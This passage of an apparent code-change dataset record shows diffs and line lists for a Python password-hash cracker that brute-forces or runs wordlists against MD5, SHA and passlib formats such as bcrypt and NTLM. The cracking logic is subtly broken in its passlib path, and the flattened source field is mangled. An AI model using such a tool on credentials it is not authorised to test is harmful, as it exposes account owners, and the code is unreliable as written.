sha256(password)\r\n-            if check == hash:\r\n-                results = f\"Match found: {password}\"\r\n-                break\r\n-        elif hash_type == \"sha512\":\r\n-            check = sha512(password)\r\n-            if check == hash:\r\n-                results = f\"Match found: {password}\"\r\n-                break\r\n-        bar.update()\r\n-    bar.close()\r\n-    return results\r\n-\r\n-\r\n-def crackHash_WordList(hash: str, file_path: str | Path):\r\n-    results = \"\"\r\n-    file_obj = open(file_path, \"r\", encoding=\"UTF-8\")\r\n-    bar = tqdm()\r\n-    for password in file_obj:\r\n-        bar.set_description(f\"Testing {password}\")\r\n-        if password == hash:\r\n-            print(\"Match found: \", password)\r\n-            bar.close()\r\n-            break\r\n-        bar.update()\r\n-\r\n-    return results\r\n+# -*- coding: UTF-8 -*-\n+\"\"\"\n+    CRYPT Brute Forcer, Password Hash Brute Forcing Tool\n+    Copyright (C) 2022  N1nj4 R8\n+\n+    CRYPT Brute Forcer is free software: you can redistribute it and\/or modify\n+    it under the terms of the GNU General Public License as published by\n+    the Free Software Foundation, either version 3 of the License, or\n+    any later version.\n+\n+    CRYPT Brute Forcer is distributed in the hope that it will be useful,\n+    but WITHOUT ANY WARRANTY; without even the implied warranty of\n+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n+    GNU General Public License for more details.\n+\n+    You should have received a copy of the GNU General Public License\n+    along with CRYPT Brute Forcer.  If not, see <https:\/\/www.gnu.org\/licenses\/>.\n+\"\"\"\n+\n+import subprocess\n+import sys\n+import os\n+import hashlib\n+from passlib.context import CryptContext\n+from pathlib import Path\n+from tqdm import tqdm\n+\n+# Colors\n+grn = \"\\x1b[0;32m\"  # Green\n+red = \"\\x1b[0;31m\"  # Red\n+wte = \"\\x1b[0;37m\"  # White\n+ppl = \"\\x1b[0;35m\"  # Purple (Magenta)\n+ylo = \"\\x1b[0;36m\"  # Yellow\n+blu = \"\\x1b[0;36m\"  # Blue\n+cyn = \"\\x1b[0;36m\"  # Cyan\n+gry = \"\\x1b[0;90m\"  # Grey (Light Black)\n+\n+default_path = f\".{os.sep}Results{os.sep}Results.txt\"\n+\n+\n+def fileWriter(\n+    txt: str | dict[str, str],\n+    cipher: str,\n+    result: str | dict[str, str],\n+    path: str = default_path,\n+    cc: bool = False,\n+    cc_key: int | str = \"Unknown\",\n+):\n+    \"\"\"\n+    Parameters:\n+    ---\n+    - txt: The input text.\n+    - cipher: The cipher name; 'Base64', 'Caesar Cipher', and ...\n+    - type: \"encrypt\" or \"decrypt\"; used for file naming.\n+    - result: The function's result that encrypts\/decrypts the text;\n+\n+    Optional:\n+    - path: The path to write the file; If not set, default will be used.\n+    - cc: checks if it's Caesar Cipher; Default is False.\n+    - cc_key: The key used to shift the text.\n+    - is_hash: Set to true if it's a hash; Default is False.\n+    \"\"\"\n+    ruler = \"#\" * 50\n+    template = f\"{ruler}\\n\\n Plain Text: {txt}\\n\\n {cipher}: {result}\\n\\n{ruler}\\n\"\n+    if cc:\n+        template = f\"{ruler}\\n\\n Plain text: {txt}\\n key: {cc_key}\\n\\n {cipher}: {result}\\n\\n{ruler}\\n\"\n+    path_dir = path.split(os.sep)\n+    path_dir.pop(-1)\n+    save_dir = Path(os.sep.join(path_dir))\n+    if not save_dir.exists():\n+        save_dir.mkdir(parents=True)\n+    with open(path, \"a+\") as file:\n+        file.write(template)\n+\n+\n+def cl():\n+    if sys.platform == \"win32\":\n+        os.system(\"cls\")\n+    elif sys.platform == \"linux\":\n+        os.system(\"clear\")\n+\n+\n+def md5(text: str) -> str:\n+    return hashlib.md5(text.encode()).hexdigest()\n+\n+\n+def sha256(text: str) -> str:\n+    return hashlib.sha256(text.encode()).hexdigest()\n+\n+\n+def sha512(text: str) -> str:\n+    return hashlib.sha512(text.encode()).hexdigest()\n+\n+\n+def crackHash_BruteForce(\n+    hash_input: str,\n+    length: int,\n+    ramp: bool,\n+    start_length: int = 1,\n+    have_letters: bool = True,\n+    have_symbols: bool = True,\n+    have_numbers: bool = True,\n+    hash_type: str = \"other\",\n+):\n+    \"\"\"\n+    ----\n+    Parameters\n+    ----------\n+    * hash: Hash to crack.\n+    * length: Length of string to iterate through.\n+    * ramp: If true, ramp up from start_length till length; Otherwise, iterate over current length values.\n+    * have_letters: Include uppercase & lowercase letters; default: True.\n+    * have_symbols: Include symbols; default: True.\n+    * have_numbers: Include 0-9 digit; default: Trues.\n+    * start_length: The length of the string to begin ramping through; default: 1.\n+    * hash_type: Type of hash trying to crack.\n+    \"\"\"\n+    from brute import brute\n+\n+    bar = tqdm(leave=True)\n+    results = \"Not found\"\n+    ctx = CryptContext(\n+        [\n+            \"md5_crypt\",\n+            \"ldap_salted_md5\",\n+            \"sha256_crypt\",\n+            \"ldap_salted_sha256\",\n+            \"sha512_crypt\",\n+            \"ldap_salted_sha512\",\n+            \"bcrypt\",\n+            \"argon2\",\n+            \"nthash\",\n+            \"pbkdf2_sha256\",\n+            \"pbkdf2_sha512\",\n+        ]\n+    )\n+    for password in brute(\n+        start_length=start_length,\n+        length=length,\n+        letters=have_letters,\n+        symbols=have_symbols,\n+        numbers=have_numbers,\n+        ramp=ramp,\n+    ):\n+        bar.set_description_str(f\"Testing '{password}'\")\n+        if hash_type == \"md5\":\n+            check = md5(password)\n+        elif hash_type == \"sha256\":\n+            check = sha256(password)\n+        elif hash_type == \"sha512\":\n+            check = sha512(password)\n+        else:\n+            check = ctx.verify(password, hash_input)\n+\n+        if check == hash_input:\n+            bar.set_description(f\"Matched '{password}'\")\n+            results = password\n+            break\n+\n+        bar.update()\n+    bar.close()\n+\n+    return results\n+\n+\n+def crackHash_WordList(hash_input: str, file_path: str, hash_type: str = \"other\"):\n+    \"\"\"\n+    ----\n+    Parameters\n+    ----------\n+    * hash_input: Hash to crack.\n+    * file_path: Path to wordlist.\n+    * hash_type: Type of hash trying to crack.\n+    \"\"\"\n+    ctx = CryptContext(\n+        [\n+            \"md5_crypt\",\n+            \"ldap_salted_md5\",\n+            \"sha256_crypt\",\n+            \"ldap_salted_sha256\",\n+            \"sha512_crypt\",\n+            \"ldap_salted_sha512\",\n+            \"bcrypt\",\n+            \"argon2\",\n+            \"nthash\",\n+            \"pbkdf2_sha256\",\n+            \"pbkdf2_sha512\",\n+        ]\n+    )\n+    results = \"Not found\"\n+    if sys.platform == \"linux\":\n+        file_size = (\n+            subprocess.check_output([\"wc\", \"-l\", file_path])\n+            .decode(\"utf-8\")\n+            .split(\" \")[0]\n+            .replace(\"L\", \"\")\n+        )\n+    else:\n+        file_size = (\n+            subprocess.check_output([\"find\", \"\/c\", \"\/v\", \"\", file_path])\n+            .decode()\n+            .split(\" \")[-1]\n+        )\n+    file_size = int(file_size)\n+\n+    bar = tqdm(total=file_size, unit=\"Lines\", leave=True)\n+    with open(file_path, \"r\", encoding=\"UTF-8\") as file_obj:\n+        for password in file_obj:\n+            password = password.strip()\n+            bar.set_description(f\"Testing '{password}'\")\n+            if hash_type == \"md5\":\n+                check = md5(password)\n+            elif hash_type == \"sha256\":\n+                check = sha256(password)\n+            elif hash_type == \"sha512\":\n+                check = sha512(password)\n+            else:\n+                check = ctx.verify(password, hash_input)\n+\n+            if check == hash_input:\n+                bar.colour = \"green\"\n+                bar.set_description(f\"Matched '{password}'\")\n+                results = password\n+                break\n+\n+            bar.update(1)\n+    bar.close()\n+\n+    return results\n","add":229,"remove":285,"filename":"\/modules\/crack.py","badparts":["\"\"\"\r","    CRYPT Brute Forcer, Password Hash Brute Forcing Tool\r","    Copyright (C) 2022  N1nj4 R8\r","\r","    CRYPT Brute Forcer is free software: you can redistribute it and\/or modify\r","    it under the terms of the GNU General Public License as published by\r","    the Free Software Foundation, either version 3 of the License, or\r","    any later version.\r","\r","    CRYPT Brute Forcer is distributed in the hope that it will be useful,\r","    but WITHOUT ANY WARRANTY; without even the implied warranty of\r","    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r","    GNU General Public License for more details.\r","\r","    You should have received a copy of the GNU General Public License\r","    along with CRYPT Brute Forcer.  If not, see <https:\/\/www.gnu.org\/licenses\/>.\r","\"\"\"\r","\r","\r","from passlib.context import CryptContext\r","from pathlib import Path\r","from brute import brute\r","from tqdm import tqdm\r","import modules.clear as clear\r","import time\r","import modules.main as main\r","from os import sep\r","from modules.functions import md5, sha256, sha512\r","\r","grn = \"\\x1b[0;32m\"  # Green\r","red = \"\\x1b[0;31m\"  # Red\r","wte = \"\\x1b[0;37m\"  # White\r","ppl = \"\\x1b[0;35m\"  # Purple (Magenta)\r","ylo = \"\\x1b[0;36m\"  # Yellow\r","blu = \"\\x1b[0;36m\"  # Blue\r","cyn = \"\\x1b[0;36m\"  # Cyan\r","gry = \"\\x1b[0;90m\"  # Grey (Light Black)\r","\r","\r","enc_path = f\".{sep}Results{sep}Encrypted.txt\"\r","dec_path = f\".{sep}Results{sep}Decrypted.txt\"\r","\r","\r","def enc_writer(\r","    txt: str,\r","    cipher: str,\r","    method: str | dict[int, str],\r","    path: str = enc_path,\r","    cc: bool = False,\r","    cc_key: int | None = None,\r","    is_hash: bool = False,\r","):\r","    \"\"\"\r","    Parameters:\r","    ---\r","        Required:\r","        ---\r","        - txt: The input text.\r","        - cipher: The cipher name; 'Base64', 'Morse Code', and ... .\r","        - method: The function that encrypts the text.\r","        * Example: Base64 --> base64_encrypt(bytes(txt, \"utf-8\"))\r","\r","        Optional:\r","        ---\r","        - path: The path to write the file.\r","        - cc: checks if it's Caesar Cipher; Default is False.\r","        - cc_key: The key used to shift the text.\r","        - is_hash: True if it's a hash; Default is False.\r","    \"\"\"\r","    deco = \"#\" * 50\r","    times = (\r","        f\"\\n At {time.localtime().tm_hour}:{time.localtime().tm_min}:{time.localtime().tm_sec}\"\r","        f\" {time.localtime().tm_mday}\/{time.localtime().tm_mon}\/{time.localtime().tm_year}\"\r","    )\r","\r","    enc_text = f\"{deco}{times}\\n\\n Plain Text: {txt}\\n\\n Encrypted {cipher}: {method}\\n\\n{deco}\\n\"\r","    if cc:\r","        enc_text = f\"{deco}{times}\\n\\n Plain Text: {txt}\\n key: {cc_key}\\n\\n Encrypted {cipher}: {method}\\n\\n{deco}\\n\"\r","    if is_hash:\r","        enc_text = f\"{deco}{times}\\n\\n Plain Text: {txt}\\n\\n {cipher} Hash: {method}\\n\\n{deco}\\n\"\r","    path_dir = path.split(sep)\r","    path_dir = path_dir.pop(-1)\r","    save_dir = Path(path_dir)\r","    if not save_dir.exists():\r","        save_dir.mkdir(parents=True)\r","    encrypted_file = open(path, \"a+\")\r","    encrypted_file.write(enc_text)\r","    encrypted_file.close()\r","\r","\r","def dec_writer(\r","    txt: str,\r","    cipher: str,\r","    method: str | dict[int, str],\r","    path: str = dec_path,\r","    cc: bool = False,\r","    cc_key: int | None = None,\r","    is_hash: bool = False,\r","):\r","    \"\"\"\r","    Parameters:\r","    ---\r","    - txt: The input text.\r","    - cipher: The cipher name; 'Base64', 'Caesar Cipher', and ...\r","    - method: The function that decrypts the text;\r","    * Example: Base64 -> base64_decrypt(bytes(txt, \"utf-8\"))\r","\r","    Optional:\r","    - path: The path to write the file; If not set, default will be used.\r","    - cc: checks if it's Caesar Cipher; Default is False.\r","    - cc_key: The key used to shift the text.\r","    \"\"\"\r","    deco = \"#\" * 50\r","    times = (\r","        f\"\\n At {time.localtime().tm_hour}:{time.localtime().tm_min}:{time.localtime().tm_sec}\"\r","        f\" {time.localtime().tm_mday}\/{time.localtime().tm_mon}\/{time.localtime().tm_year}\"\r","    )\r","\r","    dec_text = f\"{deco}{times}\\n\\n Encrypted {cipher}: {txt}\\n\\n Decrypted Text: {method}\\n\\n{deco}\\n\"\r","    if cc:\r","        dec_text = f\"{deco}{times}\\n\\n Encrypted {cipher}: {txt}\\n Key: {cc_key}\\n\\n Decrypted Text: {method}\\n\\n{deco}\\n\"\r","    if is_hash:\r","        dec_text = f\"{deco}{times}\\n\\n Hash: {txt}\\n\\n {cipher} Decrypted: {method}\\n\\n{deco}\\n\"\r","    path_dir = path.split(sep)\r","    path_dir = path_dir.pop(-1)\r","    save_dir = Path(path_dir)\r","    if not save_dir.exists():\r","        save_dir.mkdir(parents=True)\r","    decrypted_file = open(path, \"a+\")\r","    decrypted_file.write(dec_text)\r","    decrypted_file.close()\r","\r","\r","def crackHash_menu(file_write: bool):\r","    while True:\r","        clear.cl_all_v2()\r","        print(main.menu_crackers())\r","        cmd_cracker = input(f\"{grn}        CRYPT>{wte} \")\r","        if cmd_cracker == \"1\":  # Brute Force\r","            clear.cl_all_v2()\r","            hash = input(f\"\\n{grn}        [+] Hash:{wte} \")\r","            length = int(input(f\"\\n{grn}        [+] Max Length:{wte} \"))\r","            print(\r","                \"\\nIf 1, ramp up from start_length till length; Otherwise, iterate over current length values.\"\r","            )\r","            ramp = bool(int(input(f\"{grn}        [+] Ramp? [1\/0]:{wte} \")))\r","            start_length = int(input(f\"\\n{grn}        [+] Start length [0<=]:{wte} \"))\r","            have_letters = bool(\r","                int(input(f\"\\n{grn}        [+] Include Letters? [1\/0]:{wte} \"))\r","            )\r","            have_symbols = bool(\r","                int(input(f\"\\n{grn}        [+] Include Symbols? [1\/0]:{wte} \"))\r","            )\r","            have_numbers = bool(\r","                int(input(f\"\\n{grn}        [+] Include Numbers? [1\/0]:{wte} \"))\r","            )\r","            hash_type = input(\r","                f\"\\n{grn}        [+] Hash Type [md5\/sha256\/sha512\/auto]:{wte} \"\r","            ).lower()\r","            if (\r","                not hash_type in [\"md5\", \"sha256\", \"sha512\"]\r","                or not 3 <= len(hash_type) <= 6\r","            ):\r","                hash_type = \"auto\"\r","            results = crackHash_BruteForce(\r","                hash=hash,\r","                length=length,\r","                ramp=ramp,\r","                start_length=start_length,\r","                have_letters=have_letters,\r","                have_symbols=have_symbols,\r","                have_numbers=have_numbers,\r","                hash_type=hash_type,\r","            )\r","            print(f\"{ylo}\\n\\nResults:\\n{wte}{results}\")\r","\r","            if file_write:\r","                path = f\".{sep}Results{sep}Hash_BF.txt\"\r","                dec_writer(\r","                    hash,\r","                    \"Brute Forced\",\r","                    results,\r","                    path,\r","                    is_hash=True,\r","                )\r","            print(f\"{gry}\\n\\n\\t[!] {wte}Press ENTER to continue...\")\r","            input()\r","\r","        elif cmd_cracker == \"2\":  # Wordlist\r","            clear.cl_all_v2()\r","            hash = input(f\"\\n{grn}        [+] Hash:{wte} \")\r","\r","        elif cmd_cracker.upper() == \"B\":\r","            break\r","\r","\r","def crackHash_BruteForce(\r","    hash: str,\r","    length: int,\r","    ramp: bool,\r","    start_length: int = 1,\r","    have_letters: bool = True,\r","    have_symbols: bool = True,\r","    have_numbers: bool = True,\r","    hash_type: str = \"auto\",\r","):\r","    \"\"\"\r","    ----\r","    Parameters\r","    ----------\r","    * hash: Hash to crack.\r","    * length: Length of string to iterate through.\r","    * ramp: If true, ramp up from start_length till length; Otherwise, iterate over current length values.\r","    * have_letters: Include uppercase & lowercase letters; default: True.\r","    * have_symbols: Include symbols; default: True.\r","    * have_numbers: Include 0-9 digit; default: Trues.\r","    * start_length: The length of the string to begin ramping through; default: 1.\r","    * hash_type: Type of hash trying to crack.\r","    \"\"\"\r","    bar = tqdm()\r","    results = \"Match not found\"\r","    ctx = CryptContext(\r","        [\r","            \"md5_crypt\",\r","            \"ldap_salted_md5\",\r","            \"sha256_crypt\",\r","            \"ldap_salted_sha256\",\r","            \"sha512_crypt\",\r","            \"ldap_salted_sha512\",\r","            \"bcrypt\",\r","            \"argon2\",\r","            \"nthash\",\r","            \"pbkdf2_sha256\",\r","            \"pbkdf2_sha512\",\r","        ]\r","    )\r","    for password in brute(\r","        start_length=start_length,\r","        length=length,\r","        letters=have_letters,\r","        symbols=have_symbols,\r","        numbers=have_numbers,\r","        ramp=ramp,\r","    ):\r","        bar.set_description_str(f\"Testing {password}\")\r","        if hash_type == \"auto\":\r","            check = ctx.verify(password, hash)\r","            if check:\r","                results = f\"Match found: {password}\"\r","                break\r","        elif hash_type == \"md5\":\r","            check = md5(password)\r","            if check == hash:\r","                results = f\"Match found: {password}\"\r","                break\r","        elif hash_type == \"sha256\":\r","            check = sha256(password)\r","            if check == hash:\r","                results = f\"Match found: {password}\"\r","                break\r","        elif hash_type == \"sha512\":\r","            check = sha512(password)\r","            if check == hash:\r","                results = f\"Match found: {password}\"\r","                break\r","        bar.update()\r","    bar.close()\r","    return results\r","\r","\r","def crackHash_WordList(hash: str, file_path: str | Path):\r","    results = \"\"\r","    file_obj = open(file_path, \"r\", encoding=\"UTF-8\")\r","    bar = tqdm()\r","    for password in file_obj:\r","        bar.set_description(f\"Testing {password}\")\r","        if password == hash:\r","            print(\"Match found: \", password)\r","            bar.close()\r","            break\r","        bar.update()\r","\r","    return results\r"],"goodparts":["\"\"\"","    CRYPT Brute Forcer, Password Hash Brute Forcing Tool","    Copyright (C) 2022  N1nj4 R8","    CRYPT Brute Forcer is free software: you can redistribute it and\/or modify","    it under the terms of the GNU General Public License as published by","    the Free Software Foundation, either version 3 of the License, or","    any later version.","    CRYPT Brute Forcer is distributed in the hope that it will be useful,","    but WITHOUT ANY WARRANTY; without even the implied warranty of","    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the","    GNU General Public License for more details.","    You should have received a copy of the GNU General Public License","    along with CRYPT Brute Forcer.  If not, see <https:\/\/www.gnu.org\/licenses\/>.","\"\"\"","import subprocess","import sys","import hashlib","from passlib.context import CryptContext","from pathlib import Path","from tqdm import tqdm","grn = \"\\x1b[0;32m\"  # Green","red = \"\\x1b[0;31m\"  # Red","wte = \"\\x1b[0;37m\"  # White","ppl = \"\\x1b[0;35m\"  # Purple (Magenta)","ylo = \"\\x1b[0;36m\"  # Yellow","blu = \"\\x1b[0;36m\"  # Blue","cyn = \"\\x1b[0;36m\"  # Cyan","gry = \"\\x1b[0;90m\"  # Grey (Light Black)","default_path = f\".{os.sep}Results{os.sep}Results.txt\"","def fileWriter(","    txt: str | dict[str, str],","    cipher: str,","    result: str | dict[str, str],","    path: str = default_path,","    cc: bool = False,","    cc_key: int | str = \"Unknown\",","):","    \"\"\"","    Parameters:","    ---","    - txt: The input text.","    - cipher: The cipher name; 'Base64', 'Caesar Cipher', and ...","    - type: \"encrypt\" or \"decrypt\"; used for file naming.","    - result: The function's result that encrypts\/decrypts the text;","    Optional:","    - path: The path to write the file; If not set, default will be used.","    - cc: checks if it's Caesar Cipher; Default is False.","    - cc_key: The key used to shift the text.","    - is_hash: Set to true if it's a hash; Default is False.","    \"\"\"","    ruler = \"#\" * 50","    template = f\"{ruler}\\n\\n Plain Text: {txt}\\n\\n {cipher}: {result}\\n\\n{ruler}\\n\"","    if cc:","        template = f\"{ruler}\\n\\n Plain text: {txt}\\n key: {cc_key}\\n\\n {cipher}: {result}\\n\\n{ruler}\\n\"","    path_dir = path.split(os.sep)","    path_dir.pop(-1)","    save_dir = Path(os.sep.join(path_dir))","    if not save_dir.exists():","        save_dir.mkdir(parents=True)","    with open(path, \"a+\") as file:","        file.write(template)","def cl():","    if sys.platform == \"win32\":","        os.system(\"cls\")","    elif sys.platform == \"linux\":","        os.system(\"clear\")","def md5(text: str) -> str:","    return hashlib.md5(text.encode()).hexdigest()","def sha256(text: str) -> str:","    return hashlib.sha256(text.encode()).hexdigest()","def sha512(text: str) -> str:","    return hashlib.sha512(text.encode()).hexdigest()","def crackHash_BruteForce(","    hash_input: str,","    length: int,","    ramp: bool,","    start_length: int = 1,","    have_letters: bool = True,","    have_symbols: bool = True,","    have_numbers: bool = True,","    hash_type: str = \"other\",","):","    \"\"\"","    ----","    Parameters","    ----------","    * hash: Hash to crack.","    * length: Length of string to iterate through.","    * ramp: If true, ramp up from start_length till length; Otherwise, iterate over current length values.","    * have_letters: Include uppercase & lowercase letters; default: True.","    * have_symbols: Include symbols; default: True.","    * have_numbers: Include 0-9 digit; default: Trues.","    * start_length: The length of the string to begin ramping through; default: 1.","    * hash_type: Type of hash trying to crack.","    \"\"\"","    from brute import brute","    bar = tqdm(leave=True)","    results = \"Not found\"","    ctx = CryptContext(","        [","            \"md5_crypt\",","            \"ldap_salted_md5\",","            \"sha256_crypt\",","            \"ldap_salted_sha256\",","            \"sha512_crypt\",","            \"ldap_salted_sha512\",","            \"bcrypt\",","            \"argon2\",","            \"nthash\",","            \"pbkdf2_sha256\",","            \"pbkdf2_sha512\",","        ]","    )","    for password in brute(","        start_length=start_length,","        length=length,","        letters=have_letters,","        symbols=have_symbols,","        numbers=have_numbers,","        ramp=ramp,","    ):","        bar.set_description_str(f\"Testing '{password}'\")","        if hash_type == \"md5\":","            check = md5(password)","        elif hash_type == \"sha256\":","            check = sha256(password)","        elif hash_type == \"sha512\":","            check = sha512(password)","        else:","            check = ctx.verify(password, hash_input)","        if check == hash_input:","            bar.set_description(f\"Matched '{password}'\")","            results = password","            break","        bar.update()","    bar.close()","    return results","def crackHash_WordList(hash_input: str, file_path: str, hash_type: str = \"other\"):","    \"\"\"","    ----","    Parameters","    ----------","    * hash_input: Hash to crack.","    * file_path: Path to wordlist.","    * hash_type: Type of hash trying to crack.","    \"\"\"","    ctx = CryptContext(","        [","            \"md5_crypt\",","            \"ldap_salted_md5\",","            \"sha256_crypt\",","            \"ldap_salted_sha256\",","            \"sha512_crypt\",","            \"ldap_salted_sha512\",","            \"bcrypt\",","            \"argon2\",","            \"nthash\",","            \"pbkdf2_sha256\",","            \"pbkdf2_sha512\",","        ]","    )","    results = \"Not found\"","    if sys.platform == \"linux\":","        file_size = (","            subprocess.check_output([\"wc\", \"-l\", file_path])","            .decode(\"utf-8\")","            .split(\" \")[0]","            .replace(\"L\", \"\")","        )","    else:","        file_size = (","            subprocess.check_output([\"find\", \"\/c\", \"\/v\", \"\", file_path])","            .decode()","            .split(\" \")[-1]","        )","    file_size = int(file_size)","    bar = tqdm(total=file_size, unit=\"Lines\", leave=True)","    with open(file_path, \"r\", encoding=\"UTF-8\") as file_obj:","        for password in file_obj:","            password = password.strip()","            bar.set_description(f\"Testing '{password}'\")","            if hash_type == \"md5\":","                check = md5(password)","            elif hash_type == \"sha256\":","                check = sha256(password)","            elif hash_type == \"sha512\":","                check = sha512(password)","            else:","                check = ctx.verify(password, hash_input)","            if check == hash_input:","                bar.colour = \"green\"","                bar.set_description(f\"Matched '{password}'\")","                results = password","                break","            bar.update(1)","    bar.close()","    return results"]}],"source":"\n \"\"\"\r CRYPT Brute Forcer, Password Hash Brute Forcing Tool\r Copyright(C) 2022 N1nj4 R8\r \r CRYPT Brute Forcer is free software: you can redistribute it and\/or modify\r it under the terms of the GNU General Public License as published by\r the Free Software Foundation, either version 3 of the License, or\r any later version.\r \r CRYPT Brute Forcer is distributed in the hope that it will be useful,\r but WITHOUT ANY WARRANTY; without even the implied warranty of\r MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\r GNU General Public License for more details.\r \r You should have received a copy of the GNU General Public License\r along with CRYPT Brute Forcer. If not, see <https:\/\/www.gnu.org\/licenses\/>.\r \"\"\"\r \r \r from passlib.context import CryptContext\r from pathlib import Path\r from brute import brute\r from tqdm import tqdm\r import modules.clear as clear\r import time\r import modules.main as main\r from os import sep\r from modules.functions import md5, sha256, sha512\r \r grn=\"\\x1b[0;32m\" red=\"\\x1b[0;31m\" wte=\"\\x1b[0;37m\" ppl=\"\\x1b[0;35m\" ylo=\"\\x1b[0;36m\" blu=\"\\x1b[0;36m\" cyn=\"\\x1b[0;36m\" gry=\"\\x1b[0;90m\" \r \r enc_path=f\".{sep}Results{sep}Encrypted.txt\"\r dec_path=f\".{sep}Results{sep}Decrypted.txt\"\r \r \r def enc_writer(\r txt: str,\r cipher: str,\r method: str | dict[int, str],\r path: str=enc_path,\r cc: bool=False,\r cc_key: int | None=None,\r is_hash: bool=False,\r ):\r \"\"\"\r Parameters:\r ---\r Required:\r ---\r -txt: The input text.\r -cipher: The cipher name; 'Base64', 'Morse Code', and....\r -method: The function that encrypts the text.\r * Example: Base64 --> base64_encrypt(bytes(txt, \"utf-8\"))\r \r Optional:\r ---\r -path: The path to write the file.\r -cc: checks if it's Caesar Cipher; Default is False.\r -cc_key: The key used to shift the text.\r -is_hash: True if it's a hash; Default is False.\r \"\"\"\r deco=\" times=(\r f\"\\n At{time.localtime().tm_hour}:{time.localtime().tm_min}:{time.localtime().tm_sec}\"\r f\"{time.localtime().tm_mday}\/{time.localtime().tm_mon}\/{time.localtime().tm_year}\"\r )\r \r enc_text=f\"{deco}{times}\\n\\n Plain Text:{txt}\\n\\n Encrypted{cipher}:{method}\\n\\n{deco}\\n\"\r if cc:\r enc_text=f\"{deco}{times}\\n\\n Plain Text:{txt}\\n key:{cc_key}\\n\\n Encrypted{cipher}:{method}\\n\\n{deco}\\n\"\r if is_hash:\r enc_text=f\"{deco}{times}\\n\\n Plain Text:{txt}\\n\\n{cipher} Hash:{method}\\n\\n{deco}\\n\"\r path_dir=path.split(sep)\r path_dir=path_dir.pop(-1)\r save_dir=Path(path_dir)\r if not save_dir.exists():\r save_dir.mkdir(parents=True)\r encrypted_file=open(path, \"a+\")\r encrypted_file.write(enc_text)\r encrypted_file.close()\r \r \r def dec_writer(\r txt: str,\r cipher: str,\r method: str | dict[int, str],\r path: str=dec_path,\r cc: bool=False,\r cc_key: int | None=None,\r is_hash: bool=False,\r ):\r \"\"\"\r Parameters:\r ---\r -txt: The input text.\r -cipher: The cipher name; 'Base64', 'Caesar Cipher', and...\r -method: The function that decrypts the text;\r * Example: Base64 -> base64_decrypt(bytes(txt, \"utf-8\"))\r \r Optional:\r -path: The path to write the file; If not set, default will be used.\r -cc: checks if it's Caesar Cipher; Default is False.\r -cc_key: The key used to shift the text.\r \"\"\"\r deco=\" times=(\r f\"\\n At{time.localtime().tm_hour}:{time.localtime().tm_min}:{time.localtime().tm_sec}\"\r f\"{time.localtime().tm_mday}\/{time.localtime().tm_mon}\/{time.localtime().tm_year}\"\r )\r \r dec_text=f\"{deco}{times}\\n\\n Encrypted{cipher}:{txt}\\n\\n Decrypted Text:{method}\\n\\n{deco}\\n\"\r if cc:\r dec_text=f\"{deco}{times}\\n\\n Encrypted{cipher}:{txt}\\n Key:{cc_key}\\n\\n Decrypted Text:{method}\\n\\n{deco}\\n\"\r if is_hash:\r dec_text=f\"{deco}{times}\\n\\n Hash:{txt}\\n\\n{cipher} Decrypted:{method}\\n\\n{deco}\\n\"\r path_dir=path.split(sep)\r path_dir=path_dir.pop(-1)\r save_dir=Path(path_dir)\r if not save_dir.exists():\r save_dir.mkdir(parents=True)\r decrypted_file=open(path, \"a+\")\r decrypted_file.write(dec_text)\r decrypted_file.close()\r \r \r def crackHash_menu(file_write: bool):\r while True:\r clear.cl_all_v2()\r print(main.menu_crackers())\r cmd_cracker=input(f\"{grn} CRYPT>{wte} \")\r if cmd_cracker==\"1\": clear.cl_all_v2()\r hash=input(f\"\\n{grn} [+] Hash:{wte} \")\r length=int(input(f\"\\n{grn} [+] Max Length:{wte} \"))\r print(\r \"\\nIf 1, ramp up from start_length till length; Otherwise, iterate over current length values.\"\r )\r ramp=bool(int(input(f\"{grn} [+] Ramp?[1\/0]:{wte} \")))\r start_length=int(input(f\"\\n{grn} [+] Start length[0<=]:{wte} \"))\r have_letters=bool(\r int(input(f\"\\n{grn} [+] Include Letters?[1\/0]:{wte} \"))\r )\r have_symbols=bool(\r int(input(f\"\\n{grn} [+] Include Symbols?[1\/0]:{wte} \"))\r )\r have_numbers=bool(\r int(input(f\"\\n{grn} [+] Include Numbers?[1\/0]:{wte} \"))\r )\r hash_type=input(\r f\"\\n{grn} [+] Hash Type[md5\/sha256\/sha512\/auto]:{wte} \"\r ).lower()\r if(\r not hash_type in[\"md5\", \"sha256\", \"sha512\"]\r or not 3 <=len(hash_type) <=6\r ):\r hash_type=\"auto\"\r results=crackHash_BruteForce(\r hash=hash,\r length=length,\r ramp=ramp,\r start_length=start_length,\r have_letters=have_letters,\r have_symbols=have_symbols,\r have_numbers=have_numbers,\r hash_type=hash_type,\r )\r print(f\"{ylo}\\n\\nResults:\\n{wte}{results}\")\r \r if file_write:\r path=f\".{sep}Results{sep}Hash_BF.txt\"\r dec_writer(\r hash,\r \"Brute Forced\",\r results,\r path,\r is_hash=True,\r )\r print(f\"{gry}\\n\\n\\t[!]{wte}Press ENTER to continue...\")\r input()\r \r elif cmd_cracker==\"2\": clear.cl_all_v2()\r hash=input(f\"\\n{grn} [+] Hash:{wte} \")\r \r elif cmd_cracker.upper()==\"B\":\r break\r \r \r def crackHash_BruteForce(\r hash: str,\r length: int,\r ramp: bool,\r start_length: int=1,\r have_letters: bool=True,\r have_symbols: bool=True,\r have_numbers: bool=True,\r hash_type: str=\"auto\",\r ):\r \"\"\"\r ----\r Parameters\r ----------\r * hash: Hash to crack.\r * length: Length of string to iterate through.\r * ramp: If true, ramp up from start_length till length; Otherwise, iterate over current length values.\r * have_letters: Include uppercase & lowercase letters; default: True.\r * have_symbols: Include symbols; default: True.\r * have_numbers: Include 0-9 digit; default: Trues.\r * start_length: The length of the string to begin ramping through; default: 1.\r * hash_type: Type of hash trying to crack.\r \"\"\"\r bar=tqdm()\r results=\"Match not found\"\r ctx=CryptContext(\r [\r \"md5_crypt\",\r \"ldap_salted_md5\",\r \"sha256_crypt\",\r \"ldap_salted_sha256\",\r \"sha512_crypt\",\r \"ldap_salted_sha512\",\r \"bcrypt\",\r \"argon2\",\r \"nthash\",\r \"pbkdf2_sha256\",\r \"pbkdf2_sha512\",\r ]\r )\r for password in brute(\r start_length=start_length,\r length=length,\r letters=have_letters,\r symbols=have_symbols,\r numbers=have_numbers,\r ramp=ramp,\r ):\r bar.set_description_str(f\"Testing{password}\")\r if hash_type==\"auto\":\r check=ctx.verify(password, hash)\r if check:\r results=f\"Match found:{password}\"\r break\r elif 